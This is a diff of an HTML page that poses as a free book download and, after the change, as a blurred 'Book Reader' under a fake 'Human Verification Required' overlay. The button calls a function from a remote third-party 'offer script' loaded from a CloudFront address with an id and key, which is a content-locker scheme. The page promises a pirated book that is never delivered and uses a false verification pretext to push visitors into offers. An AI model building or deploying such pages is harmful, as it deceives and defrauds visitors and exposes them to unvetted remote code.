@@ -3,159 +3,190 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Download Book PDF Free</title>
+<title>Book Reader</title>
 
 <style>
 body {
-    font-family: Arial, sans-serif;
-    background: #f1f3f6;
     margin: 0;
+    font-family: Arial, sans-serif;
+    background: #1e1e1e;
+    overflow: hidden;
 }
 
-.container {
-    max-width: 900px;
-    margin: 40px auto;
-    padding: 20px;
+/* TOP BAR */
+.topbar {
+    height: 50px;
+    background: #2b2b2b;
+    color: #fff;
+    display: flex;
+    align-items: center;
+    padding: 0 20px;
+    font-weight: bold;
 }
 
-.card {
+/* LAYOUT */
+.reader {
+    display: flex;
+    height: calc(100vh - 50px);
+}
+
+/* SIDEBAR */
+.sidebar {
+    width: 90px;
+    background: #2a2a2a;
+    padding: 10px;
+}
+
+.thumb {
+    width: 70px;
+    height: 90px;
+    background: #444;
+    margin-bottom: 10px;
+    border-radius: 4px;
+}
+
+/* MAIN VIEW */
+.main {
+    flex: 1;
+    background: #3a3a3a;
+    position: relative;
+}
+
+/* BLUR EFFECT */
+.blur {
+    filter: blur(4px);
+}
+
+/* OVERLAY */
+#lockerOverlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+
+    display: flex;
+    justify-content: center;
+    align-items: center;
+
+    background: rgba(0,0,0,0.7);
+    z-index: 9999;
+}
+
+/* POPUP BOX */
+.lockerBox {
+    width: 420px;
     background: #fff;
     border-radius: 12px;
-    padding: 20px;
-    display: flex;
-    gap: 20px;
-    box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+    padding: 30px;
+    text-align: center;
+    box-shadow: 0 15px 40px rgba(0,0,0,0.4);
+    animation: fadeIn 0.3s ease;
 }
 
-.cover img {
-    width: 150px;
-    border-radius: 8px;
-}
-
-.details {
-    flex: 1;
-}
-
-h1 {
-    font-size: 24px;
+.lockerBox h2 {
     margin-bottom: 10px;
 }
 
-.meta {
-    color: #777;
-    margin-bottom: 20px;
+.lockerBox p {
+    color: #555;
+    font-size: 14px;
 }
 
+/* BUTTON */
 .btn {
-    background: #28a745;
-    color: white;
-    padding: 14px 25px;
-    border-radius: 6px;
-    text-decoration: none;
+    margin-top: 20px;
+    background: #2d6cdf;
+    color: #fff;
+    padding: 14px;
+    border-radius: 8px;
+    width: 100%;
+    border: none;
+    font-size: 16px;
     font-weight: bold;
-    display: inline-block;
+    cursor: pointer;
+    box-shadow: 0 5px 15px rgba(45,108,223,0.4);
 }
 
 .btn:hover {
-    background: #218838;
+    background: #1f5bd3;
 }
 
-.notice {
-    margin-top: 15px;
-    font-size: 13px;
+/* FOOT NOTE */
+.note {
+    font-size: 12px;
     color: #999;
+    margin-top: 15px;
 }
 
-.footer {
-    text-align: center;
-    margin-top: 30px;
-    color: #aaa;
-    font-size: 13px;
+/* ANIMATION */
+@keyframes fadeIn {
+    from {
+        transform: scale(0.9);
+        opacity: 0;
+    }
+    to {
+        transform: scale(1);
+        opacity: 1;
+    }
 }
 </style>
 </head>
 
 <body>
 
-<div class="container">
-    <div class="card">
-        <div class="cover">
-            <img id="bookCover" src="https://via.placeholder.com/150x220?text=Book">
-        </div>
+<div class="topbar">📚 BOOK READER</div>
 
-        <div class="details">
-            <h1 id="bookTitle">Loading book...</h1>
-            <div class="meta" id="bookMeta">Please wait...</div>
+<div class="reader blur" id="readerContent">
 
-            <a href="#" class="btn" onclick="unlockContent(); return false;">
-                📥 Download PDF
-            </a>
-
-            <div class="notice">
-                ✔ Fast download<br>
-                ✔ No registration<br>
-                ✔ Unlimited access
-            </div>
-        </div>
+    <div class="sidebar">
+        <div class="thumb"></div>
+        <div class="thumb"></div>
+        <div class="thumb"></div>
+        <div class="thumb"></div>
     </div>
 
-    <div class="footer">
-        © 2026 Free Library Access
+    <div class="main"></div>
+
+</div>
+
+<!-- OVERLAY LOCKER -->
+<div id="lockerOverlay">
+    <div class="lockerBox">
+        <h2>🔒 Human Verification Required</h2>
+        <p>
+            To download or access this book file, you must complete one short task.
+        </p>
+
+        <p style="font-size:13px;color:#777;">
+            ⚡ 1 task required &nbsp; ⏳ 2–3 minutes &nbsp; ✔ Access after completion
+        </p>
+
+        <button class="btn" onclick="unlockContent()">
+            🔓 Verify & Unlock Book
+        </button>
+
+        <div class="note">
+            This step is required to unlock and download the book file.
+        </div>
     </div>
 </div>
 
-<!-- ===== OFFER SCRIPT (WAJIB DI ATAS FUNCTION) ===== -->
+<!-- OFFER SCRIPT -->
 <script>
 var pSbRH_VEr_ARwVzc = {"it":4581599,"key":"5f188"};
 </script>
 <script src="https://d1qt1z4ccvak33.cloudfront.net/861b5e9.js"></script>
 
-<!-- ===== DATA DINAMIS ===== -->
-<script>
-const params = new URLSearchParams(window.location.search);
-const bookId = params.get('book') || '0593798430';
-
-const books = {
-    "0593798430": {
-        title: "The Housemaid's Secret",
-        author: "Freida McFadden",
-        cover: "https://covers.openlibrary.org/b/isbn/0593798430-L.jpg"
-    }
-};
-
-const book = books[bookId];
-
-if (book) {
-    document.getElementById("bookTitle").innerText = book.title;
-    document.getElementById("bookMeta").innerText = "by " + book.author;
-    document.getElementById("bookCover").src = book.cover;
-} else {
-    document.getElementById("bookTitle").innerText = "Free PDF Download";
-    document.getElementById("bookMeta").innerText = "Access full book instantly";
-}
-</script>
-
-<!-- ===== LOCKER TRIGGER ===== -->
+<!-- LOGIC -->
 <script>
 function unlockContent() {
-    alert("Preparing your download...");
-    setTimeout(function(){
-        if (typeof _kt === "function") {
-            _kt();
-        } else {
-            alert("Offer belum ready, coba refresh.");
-        }
-    }, 1500);
+    if (typeof _kt === "function") {
+        _kt();
+    } else {
+        alert("Loading offer...");
+    }
 }
-
-// AUTO POPUP (OPSIONAL - BISA DIMATIKAN)
-window.onload = function() {
-    setTimeout(function(){
-        if (typeof _kt === "function") {
-            _kt();
-        }
-    }, 4000);
-};
 </script>
 
 </body>
